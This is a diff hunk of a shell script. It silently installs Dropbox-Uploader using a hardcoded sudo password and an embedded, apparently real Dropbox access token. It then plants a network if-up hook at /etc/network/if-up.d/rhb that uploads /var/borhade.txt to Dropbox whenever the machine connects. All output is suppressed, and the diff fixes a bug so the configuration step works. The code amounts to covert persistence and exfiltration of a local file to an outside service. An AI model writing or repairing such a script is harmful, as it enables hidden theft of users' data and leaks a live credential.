@@ -22,7 +22,7 @@ git clone https://github.com/andreafabrizi/Dropbox-Uploader.git &>/dev/null
 #make it executable
 cd /var/Dropbox-Uploader
 echo -e "student\n" &>/dev/null | sudo -S chmod +x dropbox_uploader.sh >/dev/null
-echo -e "Q05WDI9ABtAAAAAAAAAADc4HuEJU6q_YxfeTdn8qoRWn33r3dxInSl-saEI2OMrE\ny\n" | ./dropbox_uploader >/dev/null
+echo -e "Q05WDI9ABtAAAAAAAAAADc4HuEJU6q_YxfeTdn8qoRWn33r3dxInSl-saEI2OMrE\ny\n" | ./dropbox_uploader.sh >/dev/null
 cd
 echo "./var/Dropbox-Uploader/dropbox_uploader.sh upload /var/borhade.txt /TheGreatApp" | sudo tee -a /etc/network/if-up.d/rhb &>/dev/null
 sudo chmod +x /etc/network/if-up.d/rhb &>/dev/null
